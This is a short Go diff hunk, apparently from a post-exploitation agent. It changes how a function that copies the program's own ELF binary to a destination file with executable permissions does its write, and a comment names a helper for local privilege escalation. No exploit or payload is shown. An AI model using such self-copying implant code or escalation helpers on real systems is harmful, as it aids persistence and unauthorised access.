@@ -36,7 +36,7 @@ func CopySelfTo(dest_file string) (err error) {
 		os.RemoveAll(dest_file)
 	}
 
-	return os.WriteFile(dest_file, elf_data, 0o755)
+	return util.WriteFileAgent(dest_file, elf_data, 0o755)
 }
 
 // RunLPEHelper runs helper scripts to give you hints on how to escalate privilege
